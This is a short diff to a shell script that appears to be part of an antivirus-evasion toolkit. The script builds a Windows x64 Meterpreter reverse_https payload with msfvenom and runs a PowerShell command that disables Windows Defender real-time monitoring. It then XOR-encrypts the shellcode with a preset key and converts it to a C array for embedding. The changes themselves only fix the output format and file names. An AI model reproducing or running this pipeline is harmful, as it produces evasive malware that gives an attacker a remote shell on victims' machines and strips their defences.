@@ -23,7 +23,7 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload
-msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f c --platform Windows > input/sc_c.txt
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f raw --platform Windows > input/sc_raw.txt
 
 # try to disable Windows Defender's real-time protection via powershell
 set_command_source static_from_here 'Set-MpPreference -DisableRealtimeMonitoring $true'
@@ -33,7 +33,7 @@ set_command_exec exec_via_powershell
 generate_key preset aabbcc12de input/key_raw.txt
 
 # encrypt payload
-encode_payload xor input/scraw.txt input/scenc_raw.txt input/key_raw.txt
+encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
 
 # convert to c array format for static include
 ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
